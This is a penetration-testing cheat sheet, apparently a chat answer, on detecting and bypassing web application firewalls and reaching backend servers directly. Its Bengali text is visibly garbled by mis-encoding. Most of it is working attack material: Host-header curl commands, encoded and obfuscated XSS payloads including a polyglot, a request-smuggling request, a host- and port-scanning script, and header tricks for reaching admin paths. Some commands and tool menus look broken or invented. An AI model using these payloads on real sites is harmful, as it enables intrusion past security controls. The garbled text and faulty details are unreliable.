WAF Bypass + Direct Server Access - Authorized pentest à¦à¦° à¦œà¦¨à§à¦¯ goldà¥¤ WAF blind à¦•à¦°à§‡ à¦¦à¦¿à¦²à§‡ backend à¦¸à¦°à¦¾à¦¸à¦°à¦¿ access + vuln chaining à¦à¦° opportunityà¥¤ Methodical approach:

ğŸ¯ WAF Fingerprinting First

Step 1: WAF Detection
bash
# Common WAF signatures
curl -s "https://target.com/?xss=<script>alert(1)</script>" | grep -i "blocked\|waf\|modsecurity"

# Headers check
curl -I https://target.com | grep -i "server\|x-waf\|cf-ray"

# Response analysis
curl "https://target.com/" -H "X-Forwarded-For: 127.0.0.1"

WAF Types to Identify
Cloudflare (CF-Ray header)
AWS WAF (x-amz-*)
ModSecurity (403 details)
Sucuri/F5 (custom 403 pages)
ğŸ› ï¸ Direct Server Access Vectors

1. Host Header Abuse
bash
# Direct IP access
curl -H "Host: target.com" http://DIRECT_IP/

# Internal host bypass
curl -H "Host: localhost" https://target.com/
curl -H "Host: 127.0.0.1" https://target.com/
curl -H "Host: internal.target.local" https://target.com/

2. Alternate Port Access
bash
# Common internal ports
nmap -p 8080,8443,9000,DIRECT_IP
curl http://DIRECT_IP:8080/
curl https://target.com:8443/

3. DNS/Reverse Lookup Bypass
target.com â†’ 192.0.2.1
curl http://192.0.2.1/
curl http://target.com.xip.io/

ğŸ”¥ WAF Bypass Techniques
Method 1: Encoding Evasion
# URL encoding (double/triple)
<script> â†’ %3Cscript%3E â†’ %253Cscript%253E

# Unicode
<script> â†’ \u003cscript\u003e
ï¿½%u003cscript%u003e

# HTML entities  
&lt;script&gt;alert(1)&lt;/script&gt;

Method 2: Parameter Contamination
GET /search?q=<script>&search=<script>
GET /page?param=<script>;param2=<script>
POST body: {"q":"<script>","q2":"<script>"}

Method 3: HTTP Request Smuggling
bash
# CL.TE smuggling
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1

ğŸ§ª Burp Suite Pro Workflow
1. WAF Bypass Module
Engagement Tools â†’ WAF Bypass Generator
- Payload: <script>alert(1)</script>
- Generate 100+ variations
- Intruder â†’ Cluster bomb attack

2. Direct IP Recon
Target â†’ Scope â†’ Add DIRECT_IP:80,443
Spider â†’ Bypass WAF paths
Passive Scanner â†’ Misconfig detection

3. Custom Intruder Payloads
Â§Â§Â§ â†’ <script>,<svg onload=alert(1)>,javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>/

ğŸš€ Server Direct Access Script
bash
#!/bin/bash
TARGET="target.com"
IP=$(dig +short $TARGET)

echo "[+] Target: $TARGET â†’ $IP"

# Host header attacks
for host in "localhost" "127.0.0.1" "internal.$TARGET" "$TARGET"; do
  echo "[*] Testing Host: $host"
  curl -s -H "Host: $host" "http://$IP/" \
    | grep -i "admin\|dashboard\|login"
done

# Port scan
nmap -sV --top-ports 20 -T4 $IP
ğŸ’¥ Backend Direct Access PoC

1. Admin Panel Exposure
WAF: target.com/admin â†’ 403
Direct: http://IP/admin â†’ 200 OK (login page)
Impact: Admin access without WAF protection

2. API Endpoint Bypass
WAF: target.com/api/users â†’ Rate limited
Direct: http://IP:8080/api/users â†’ Full data dump

3. Static File Access
WAF blocks: /config/database.yml
Direct IP: http://IP/config/database.yml â†’ Downloaded

ğŸ“‹ Report Chain Example
Title: WAF Bypass â†’ Direct Server Access â†’ Admin Takeover

1. WAF Fingerprint: Cloudflare (CF-Ray header)
2. Bypass: <svg onload=alert(1)> â†’ Success (encoding)
3. Direct IP: 192.0.2.1:8080/admin â†’ Open
4. Default creds: admin/admin â†’ Access
5. Impact: Full server control

CVSS: 9.8 (Critical)

ğŸ”„ Advanced Bypass
1. HTTP/2 vs HTTP/1.1
curl --http2 -H "Trailer: x-test: <script>" https://target.com/

2. CDN Origin Bypass
X-Original-URL: /admin
X-Rewrite-URL: /admin
Front-End-Https: on

3. WAF Logic Bypass
# Case variation
<ScRiPt>alert(1)</sCrIpT>

# Comment injection  
<scr/*ipt*/>ipt>alert(1)</script>

# Null byte  
<script%00>alert(1)</script>

ğŸ›¡ï¸ Permission Proof Integration
âœ… Authorized pentest scope: target.com + all IPs
âœ… Direct IP access: 192.0.2.1 (verified ownership)
âœ… WAF bypass payloads disclosed responsibly
âœ… No data modification - read-only testing

âš¡ Quick Validation Commands
bash
# 30 second WAF bypass test
curl -s "https://target.com/?test=<svg/onload=alert(1)>" | grep -i "403\|blocked" || echo "WAF bypassed!"

# Direct server check
curl -H "Host: target.com" http://$(dig +short target.com)/admin
Pentest Priority:

IP:Port enumeration (8080,8443 common)
Host header manipulation
WAF bypass payloads (encoding first)
Internal path fuzzing (/admin,/debug,/api/raw)
Golden Find: WAF bypass + unprotected admin panel = instant criticalà¥¤
